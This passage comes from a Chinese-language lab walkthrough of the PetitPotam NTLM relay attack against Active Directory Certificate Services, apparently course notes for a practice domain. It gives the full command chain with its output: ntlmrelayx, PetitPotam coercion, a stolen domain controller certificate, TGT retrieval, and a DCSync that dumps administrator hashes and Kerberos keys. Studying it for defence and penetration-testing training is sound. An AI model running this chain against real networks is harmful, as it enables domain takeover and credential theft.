class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>一旦漏洞利用程序运行，会注意到 Meterpreter 会话已启动。然后，可以进入 SYSTEM shell，并看到仅从标准域用户帐户开始就拥有目标域控制器上的 NT AUTHORITY\SYSTEM 权限。</p><h2 id="PetitPotam-MS-EFSRPC"><a href="#PetitPotam-MS-EFSRPC" class="headerlink" title="PetitPotam (MS-EFSRPC)"></a>PetitPotam (MS-EFSRPC)</h2><p>PetitPotam ( <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942">CVE-2021-36942</a> ) 是一个 LSA 欺骗漏洞，已于 2021 年 8 月修补。该漏洞允许未经身份验证的攻击者滥用 Microsoft的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31">加密文件系统远程协议 (MS-EFSRPC)</a>，通过<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc">本地安全机构远程协议 (LSARPC)</a>通过端口 445 使用 NTLM 强迫域控制器对另一台主机进行身份验证。此技术允许未经身份验证的攻击者接管正在使用<a href="https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs">Active Directory 证书服务 (AD CS)</a>的 Windows 域。在攻击中，来自目标域控制器的身份验证请求被中继到证书颁发机构 (CA) 主机的 Web 注册页面，并为新的数字证书发出证书签名请求 (CSR)。然后可以将此证书与<code>Rubeus</code> 或 <a href="https://github.com/dirkjanm/PKINITtools">PKINITtools</a> 中的<code>gettgtpkinit.py</code>等工具一起使用，为域控制器请求 TGT，然后可以使用该 TGT 通过 DCSync 攻击实现域入侵。</p><p>这篇<a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">博客文章</a>更详细地介绍了 NTLM 中继到 AD CS 和 PetitPotam 攻击。</p><h3 id="Intercept-Certificate"><a href="#Intercept-Certificate" class="headerlink" title="Intercept Certificate"></a>Intercept Certificate</h3><p>首先，需要在攻击主机上的一个窗口中启动<code>ntlmrelayx.py</code>，指定 CA 主机的 Web 注册 URL，并使用 KerberosAuthentication 或 DomainController AD CS 模板。如果不知道 CA 的位置，可以使用<a href="https://github.com/zer1t0/certi">certi</a>等工具来尝试找到它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - </span><br><span class="line"></span><br><span class="line">Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br></pre></td></tr></table></figure><p>在另一个窗口中，运行工具<a href="https://github.com/topotam/PetitPotam">PetitPotam.py</a>。使用命令运行此工具<code>python3 PetitPotam.py &lt;attack host IP&gt; &lt;Domain Controller IP&gt;</code>，尝试强制域控制器对运行 ntlmrelayx.py 的主机进行身份验证。</p><p>此工具有一个可执行版本，可从 Windows 主机运行。身份验证触发器也已添加到 Mimikatz，可以使用加密文件系统 (EFS) 模块按如下方式运行：<code>misc::efs /server:&lt;Domain Controller&gt; /connect:&lt;ATTACK HOST&gt;</code>。该工具还有一个 PowerShell 实现<a href="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1">Invoke-PetitPotam.ps1</a>。</p><p>在这里运行该工具并尝试通过<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8">EfsRpcOpenFileRaw</a>方法强制进行身份验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ python3 PetitPotam.py 172.16.5.225 172.16.5.5</span><br><span class="line">                                                                                 </span><br><span class="line">              ___            _        _      _        ___            _                     </span><br><span class="line">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span><br><span class="line">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#x27;  \  </span><br><span class="line">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span><br><span class="line">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span><br><span class="line">          &quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27;&quot;`-0-0-&#x27; </span><br><span class="line">                                         </span><br><span class="line">              PoC to elicit machine account authentication via some MS-EFSRPC functions</span><br><span class="line">                                      by topotam (@topotam77)</span><br><span class="line">      </span><br><span class="line">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span><br><span class="line"></span><br><span class="line">Trying pipe lsarpc</span><br><span class="line">[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line"></span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br></pre></td></tr></table></figure><p>回到另一个窗口，如果攻击成功，将看到成功的登录请求并获取域控制器的 base64 编码证书。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] HTTP server returned error code 200, treating as a successful login</span><br><span class="line">[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED</span><br><span class="line">[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] HTTP server returned error code 200, treating as a successful login</span><br><span class="line">[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED</span><br><span class="line">[*] Generating CSR...</span><br><span class="line">[*] CSR generated!</span><br><span class="line">[*] Getting certificate...</span><br><span class="line">[*] GOT CERTIFICATE!</span><br><span class="line">[*] Base64 certificate of user ACADEMY-EA-DC01$: </span><br><span class="line">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</span><br><span class="line">[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><p>接下来，可以获取这个 base64 证书并用<code>gettgtpkinit.py</code>为域控制器请求票证授予票证 (TGT)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache</span><br><span class="line"></span><br><span class="line">2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275</span><br><span class="line">INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275</span><br><span class="line">2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br></pre></td></tr></table></figure><p>上面请求的 TGT 被保存到<code>dc01.ccache</code>文件中，用该文件设置 KRB5CCNAME 环境变量，因此攻击主机使用此文件进行 Kerberos 身份验证尝试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export KRB5CCNAME=dc01.ccache</span><br></pre></td></tr></table></figure><h3 id="DCSync-using-TGT"><a href="#DCSync-using-TGT" class="headerlink" title="DCSync using TGT"></a>DCSync using TGT</h3><h4 id="Impacket-secretsdump-py"><a href="#Impacket-secretsdump-py" class="headerlink" title="Impacket secretsdump.py"></a>Impacket secretsdump.py</h4><p>然后，可以使用这个 TGT<code>secretsdump.py</code>执行 DCSYnc 并检索域的一个或所有 NTLM 密码哈希。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure><p>还可以使用更简单的命令：<code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code>因为该工具将从 ccache 文件中检索用户名。可以通过输入<code>klist</code>来查看（使用该<code>klist</code>命令需要在攻击主机上安装<a href="https://packages.ubuntu.com/focal/krb5-user">krb5-user</a>包。该包已安装在实验室中的 ATTACK01 上）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 